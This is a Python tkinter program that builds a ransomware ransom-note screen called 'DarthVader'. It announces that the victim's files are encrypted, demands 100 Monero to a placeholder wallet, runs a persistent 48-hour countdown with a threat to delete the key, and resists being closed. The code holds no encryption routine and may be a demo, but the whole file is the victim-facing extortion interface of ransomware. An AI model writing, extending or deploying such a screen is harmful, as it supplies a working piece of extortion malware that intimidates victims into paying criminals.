import tkinter as tk
from tkinter import messagebox
from tkinter import PhotoImage
import time
import threading
import os
import webbrowser

class Window:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("DarthVader")
        self.root.geometry("800x600")  # Aumentar el tamaño de la ventana
        self.root.configure(bg="black")
        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.thread = threading.Thread(target=self.countdown)
        self.thread.start()
        self.root.mainloop()

    def create_widgets(self):
        logo_path = "logo.png"
        if os.path.exists(logo_path):
            self.logo = PhotoImage(file=logo_path)
        else:
            self.logo = None  # Fallback if logo.png is not found

        # Frame for the left side
        left_frame = tk.Frame(self.root, bg="black")
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=20, pady=20)

        self.logo_label = tk.Label(left_frame, image=self.logo, bg="black")
        self.logo_label.pack(pady=10)

        self.title_label = tk.Label(left_frame, text="Ooops, your files have been encrypted!", font=("Helvetica", 16, "bold"), fg="red", bg="black")
        self.title_label.pack(pady=10)

        self.message_label = tk.Label(left_frame, text="What happened to my computer?\n\nAll your files have been encrypted due to a security problem with your PC.\nIf you want to restore them, you need to pay.\n\nIf you don't pay the key for decrypt will be deleted", justify="left", fg="white", bg="black")
        self.message_label.pack(pady=10)

        self.time_label = tk.Label(left_frame, text="Tiempo restante: 48:00:00", font=("Helvetica", 14), fg="yellow", bg="black")
        self.time_label.pack(pady=10)

        self.pay_button = tk.Button(left_frame, text="Pay Now", command=self.pay_now, font=("Helvetica", 14), bg="red", fg="white")
        self.pay_button.pack(pady=20)

        self.instructions = tk.Text(left_frame, height=5, width=50, bg="black", fg="white", font=("Helvetica", 12), wrap=tk.WORD)
        self.instructions.insert(tk.END, "Instructions:\n1. Go to https://crypto.com\n2. Pay 100 Monero (XMR) to the wallet address WALLET\n3. After payment, you will receive the decryption key.")
        self.instructions.config(state=tk.DISABLED)
        self.instructions.pack(pady=10)

        # Frame for the right side
        right_frame = tk.Frame(self.root, bg="black")
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=20, pady=20)

        self.description_label = tk.Label(right_frame, text="What is Ransomware?", font=("Helvetica", 14, "bold"), fg="white", bg="black")
        self.description_label.pack(pady=10)

        self.description_text = tk.Text(right_frame, height=15, width=40, bg="black", fg="white", font=("Helvetica", 12), wrap=tk.WORD)
        self.description_text.insert(tk.END, "Ransomware is a type of malicious software designed to block access to a computer system until a sum of money is paid. It typically spreads through phishing emails or by exploiting vulnerabilities in software. Once a system is infected, the ransomware encrypts files and demands a ransom to restore access.")
        self.description_text.config(state=tk.DISABLED)
        self.description_text.pack(pady=10)

    def countdown(self):
        total_seconds = self.load_time_remaining()
        while total_seconds > 0:
            hours, remainder = divmod(total_seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            time_format = f"{hours:02}:{minutes:02}:{seconds:02}"
            self.time_label.config(text=f"Tiempo restante: {time_format}")
            self.root.update()
            time.sleep(1)
            total_seconds -= 1
            self.save_time_remaining(total_seconds)
        self.on_closing()

    def load_time_remaining(self):
        if os.path.exists("time_remaining.txt"):
            with open("time_remaining.txt", "r") as file:
                return int(file.read().strip())
        else:
            return 48 * 60 * 60

    def save_time_remaining(self, total_seconds):
        with open("time_remaining.txt", "w") as file:
            file.write(str(total_seconds))

    def pay_now(self):
        webbrowser.open("https://crypto.com")
        messagebox.showinfo("Payment", "Pay 100 Monero (XMR) to my wallet (WALLET) to decrypt your files")

    def on_closing(self):
        if messagebox.askokcancel("Salir", "You can't close the window. You need to pay to decrypt your files."):
            pass

if __name__ == "__main__":
    window = Window()